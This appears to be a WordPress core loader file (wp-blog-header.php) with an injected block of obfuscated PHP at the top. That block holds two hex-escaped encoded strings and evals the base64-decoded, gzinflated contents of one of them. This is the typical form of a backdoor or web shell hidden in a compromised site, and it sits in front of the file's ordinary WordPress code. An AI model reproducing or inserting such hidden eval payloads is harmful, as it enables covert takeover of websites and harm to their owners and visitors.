<?php
$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
$Lix = "gIUINQtO\x62H1D10m\x41R8Sk\x62879W7D9qe\x2b/lv\x42\x62\x63D\x43r3y7gf1ZR\x41f4h\x2bEm\x43Ux9hoYP\x43kDLPk5h\x63TN\x42OhI\x639XVQZJHN4H\x63wDQe0RJiOTh3OvsNu\x43UeW\x41J\x43LzN7ULp6\x42Lt\x6378\x41P2vw\x2bGWnY\x410L1yGMk33O\x61Kpmi7Ejv\x62wotSYOPTSn\x62JVPoTG5mvLJ\x61Syrd2d6Rr/twm6VfRyZR4\x41H0vq6N\x63qrgX\x61Mw\x63kiJEe5IrUvm/TJyI2Skp\x62wZqQpuJmlqkqm\x62JkoyL4vOExrPiSKXsN15d6\x2bqI5l\x626Uk/ZNd72p2\x62fkW\x610j\x63NVLE8zxFQlur0DEgyr1dMU\x41lVYpRxDQxNuxW\x41U89Gz7F5zMUk8ZU87\x43tqX\x61ZKO1\x42W1yhV\x2b\x62rYkyz\x634YJ9H1iKktlT6t\x43SMzHXwf8IslriQYD\x636QWUFMLKJq\x63\x41XyVJh5YYHq\x61R9pQUUZJpz5665mhNLsdEEWXX3n87WXL/lp44j81d\x62\x4130wtw9M2XG9EE/k/1sNF/19\x613eI7HWqILdIDZgT/n9u4PuMPr8y4ng5STX/hMSTQnH9ZXTyvG1\x2b6Qf3u\x63ydlyvxoXJoNoP\x43\x62VqTiv8\x61E7\x42f\x2bhj1lynlVJRt\x43MUOtLn\x435d466DiWMzFM6YRU\x63H1\x42fRF\x2bdoKFrxlzldL5tz570j/l\x42Lp3\x43T\x2b89rz360F3lHRR\x2b/g3EfUh5lW\x61\x42QXzPkV\x41g3wUg\x42NqyU4SoPtT9QnSqVYoRPG6QsMYDkSe\x6175JlTRjS6Ggven\x43R0/Tnzv7yefPxSXZL\x2bwg\x43PluL7/fdS7JJ9\x61SVW\x623yspIEqPUYimqNVQp\x41uurUhZPUQikkhExw/nmP9D\x42M\x62/07U1\x62/jK\x41X\x42wJe9jp\x41nFQ/TK\x41\x62\x42wJe9jo\x413FQ/DK\x41f\x42wJe9jn\x41HGQ/zJ\x41j\x42wJe";
eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
?>
<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

if ( ! isset( $wp_did_header ) ) {

    $wp_did_header = true;

    // Load the WordPress library.
    require_once __DIR__ . '/wp-load.php';

    // Set up the WordPress query.
    wp();

    // Load the theme template.
    require_once ABSPATH . WPINC . '/template-loader.php';

}
?>
